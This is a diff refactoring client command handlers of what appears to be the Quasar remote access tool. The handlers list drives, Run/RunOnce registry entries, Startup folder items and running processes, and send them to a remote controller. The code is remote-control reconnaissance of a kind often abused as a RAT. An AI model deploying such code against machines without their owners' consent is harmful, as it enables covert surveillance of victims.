@@ -1,21 +1,20 @@
-﻿using System;
+﻿using Microsoft.Win32;
+using Quasar.Common.Enums;
+using Quasar.Common.Messages;
+using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Linq;
 using System.Net.NetworkInformation;
 using System.Windows.Forms;
-using Microsoft.Win32;
-using Quasar.Common.Enums;
-using Quasar.Common.Messages;
-using Quasar.Common.Models;
 using xClient.Config;
 using xClient.Core.Data;
 using xClient.Core.Extensions;
 using xClient.Core.Helper;
 using xClient.Core.Networking;
 using xClient.Core.Utilities;
-using File = System.IO.File;
+using Models = Quasar.Common.Models;
 
 namespace xClient.Core.Commands
 {
@@ -46,7 +45,7 @@ namespace xClient.Core.Commands
                 return;
             }
 
-            Drive[] drives = new Drive[driveInfos.Length];
+            Models.Drive[] drives = new Models.Drive[driveInfos.Length];
             for (int i = 0; i < drives.Length; i++)
             {
                 try
@@ -58,7 +57,7 @@ namespace xClient.Core.Commands
                         : string.Format("{0} [{1}, {2}]", driveInfos[i].RootDirectory.FullName,
                             FormatHelper.DriveTypeName(driveInfos[i].DriveType), driveInfos[i].DriveFormat);
 
-                    drives[i] = new Drive
+                    drives[i] = new Models.Drive
                         { DisplayName = displayName, RootDirectory = driveInfos[i].RootDirectory.FullName };
                 }
                 catch (Exception)
@@ -106,7 +105,7 @@ namespace xClient.Core.Commands
         {
             try
             {
-                List<StartupItem> startupItems = new List<StartupItem>();
+                List<Models.StartupItem> startupItems = new List<Models.StartupItem>();
 
                 using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
                 {
@@ -114,7 +113,7 @@ namespace xClient.Core.Commands
                     {
                         foreach (var item in key.GetKeyValues())
                         {
-                            startupItems.Add(new StartupItem
+                            startupItems.Add(new Models.StartupItem
                                 {Name = item.Item1, Path = item.Item2, Type = StartupType.LocalMachineRun});
                         }
                     }
@@ -125,7 +124,7 @@ namespace xClient.Core.Commands
                     {
                         foreach (var item in key.GetKeyValues())
                         {
-                            startupItems.Add(new StartupItem
+                            startupItems.Add(new Models.StartupItem
                                 {Name = item.Item1, Path = item.Item2, Type = StartupType.LocalMachineRunOnce});
                         }
                     }
@@ -136,7 +135,7 @@ namespace xClient.Core.Commands
                     {
                         foreach (var item in key.GetKeyValues())
                         {
-                            startupItems.Add(new StartupItem
+                            startupItems.Add(new Models.StartupItem
                                 {Name = item.Item1, Path = item.Item2, Type = StartupType.CurrentUserRun});
                         }
                     }
@@ -147,7 +146,7 @@ namespace xClient.Core.Commands
                     {
                         foreach (var item in key.GetKeyValues())
                         {
-                            startupItems.Add(new StartupItem
+                            startupItems.Add(new Models.StartupItem
                                 {Name = item.Item1, Path = item.Item2, Type = StartupType.CurrentUserRunOnce});
                         }
                     }
@@ -160,7 +159,7 @@ namespace xClient.Core.Commands
                         {
                             foreach (var item in key.GetKeyValues())
                             {
-                                startupItems.Add(new StartupItem
+                                startupItems.Add(new Models.StartupItem
                                     {Name = item.Item1, Path = item.Item2, Type = StartupType.LocalMachineWoW64Run});
                             }
                         }
@@ -171,7 +170,7 @@ namespace xClient.Core.Commands
                         {
                             foreach (var item in key.GetKeyValues())
                             {
-                                startupItems.Add(new StartupItem
+                                startupItems.Add(new Models.StartupItem
                                 {
                                     Name = item.Item1, Path = item.Item2, Type = StartupType.LocalMachineWoW64RunOnce
                                 });
@@ -183,10 +182,8 @@ namespace xClient.Core.Commands
                 {
                     var files = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Startup)).GetFiles();
 
-                    startupItems.AddRange(from file in files
-                        where file.Name != "desktop.ini"
-                        select new StartupItem()
-                            {Name = file.Name, Path = file.FullName, Type = StartupType.StartMenu});
+                    startupItems.AddRange(files.Where(file => file.Name != "desktop.ini").Select(file => new Models.StartupItem
+                        {Name = file.Name, Path = file.FullName, Type = StartupType.StartMenu}));
                 }
 
                 client.Send(new GetStartupItemsResponse {StartupItems = startupItems});
@@ -388,20 +385,20 @@ namespace xClient.Core.Commands
         public static void HandleGetProcesses(GetProcesses command, Client client)
         {
             Process[] pList = Process.GetProcesses();
-            string[] processes = new string[pList.Length];
-            int[] ids = new int[pList.Length];
-            string[] titles = new string[pList.Length];
+            var processes = new Models.Process[pList.Length];
 
-            int i = 0;
-            foreach (Process p in pList)
+            for (int i = 0; i < pList.Length; i++)
             {
-                processes[i] = p.ProcessName + ".exe";
-                ids[i] = p.Id;
-                titles[i] = p.MainWindowTitle;
-                i++;
+                var process = new Models.Process
+                {
+                    Name = pList[i].ProcessName + ".exe",
+                    Id = pList[i].Id,
+                    MainWindowTitle = pList[i].MainWindowTitle
+                };
+                processes[i] = process;
             }
 
-            client.Send(new GetProcessesResponse {Processes = processes, Ids = ids, Titles = titles});
+            client.Send(new GetProcessesResponse {Processes = processes});
         }
 
         public static void HandleDoProcessStart(DoProcessStart command, Client client)
